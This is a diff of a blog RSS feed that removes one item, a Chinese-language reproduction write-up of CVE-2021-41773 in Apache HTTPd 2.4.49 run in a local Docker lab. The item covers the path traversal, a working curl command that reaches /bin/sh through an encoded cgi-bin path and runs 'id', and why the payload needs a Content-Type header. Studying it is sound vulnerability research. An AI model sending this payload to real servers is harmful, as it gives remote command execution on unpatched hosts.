@@ -33,29 +33,5 @@ windows上的RCE Windows版本的Apache通过目录穿越来读取cmd.exe，会�
 https://mp.weixin.qq.com/s?__biz=Mzg3MTU0MjkwNw==&amp;amp;mid=2247484889&amp;amp;idx=1&amp;amp;sn=3b3312b592554caa51e1cfcbacd832f0&amp;amp;chksm=cefdbccdf98a35dbf3ab94bb4fa60b63f6e6afd92224744cd496cd59658bee29e6e89cc801de&amp;amp;token=495462423&amp;amp;lang=zh_CN&amp;amp;scene=21#wechat_redirect</description>
     </item>
     
-    <item>
-      <title>CVE-2021-41773 Apache HTTPd (2.4.49)</title>
-      <link>/posts/4177355555/</link>
-      <pubDate>Sun, 10 Oct 2021 00:00:00 +0000</pubDate>
-      
-      <guid>/posts/4177355555/</guid>
-      <description>一、 复现环境 https://github.com/blasty/CVE-2021-41773
-1  docker-compose build &amp;amp;&amp;amp; docker-compose up -d   二、目录穿越  不能在浏览器复现，会被自动去掉..
- 三、RCE 前提：
-安装Apache之后，默认并不包含cgi 模块，需要我们自行安装以完成cgi解析，那么有没有可能在启用mod_cgi模块的前提下，实现RCE呢？
-所以前提是启用mod_cgid和mod_cgi模块。
-Linux上的apache实现回显RCE： 在linux上直接可以：
-1 2  curl -s --path-as-is -d &amp;#39;echo Content-Type: text/plain; echo; id&amp;#39; &amp;#34;http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh&amp;#34; uid=33(www-data) gid=33(www-data) groups=33(www-data)   使用burp：
-1  echo Content-Type: text/plain;echo;id   原理：
-直接执行命令无回显的且报500：
-原因是ap_scan_script_header_err_core_ex函数主要负责从cgi处理结果中读取输入，并确保输出格式符合一定要求。大体来说就是解析后的结果必须符合http协议规范，我们知道http请求分为header和body，且中间需要使用\r\n进行分割。
-也就是说，apache将cgi解析结果作为了http响应包的一部分。
-所以才有了如上构造的payload。
-windows上的RCE Windows版本的Apache通过目录穿越来读取cmd.exe，会提示mallformed header from script，无法实现命令执行。
-但是利用相应的cgi模块可以实现代码执行。
-参考资料 https://mp.weixin.qq.com/s/mx7_wTnU7IWxzeG7e6faTQ
-https://mp.weixin.qq.com/s?__biz=Mzg3MTU0MjkwNw==&amp;amp;mid=2247484889&amp;amp;idx=1&amp;amp;sn=3b3312b592554caa51e1cfcbacd832f0&amp;amp;chksm=cefdbccdf98a35dbf3ab94bb4fa60b63f6e6afd92224744cd496cd59658bee29e6e89cc801de&amp;amp;token=495462423&amp;amp;lang=zh_CN&amp;amp;scene=21#wechat_redirect</description>
-    </item>
-    
   </channel>
 </rss>
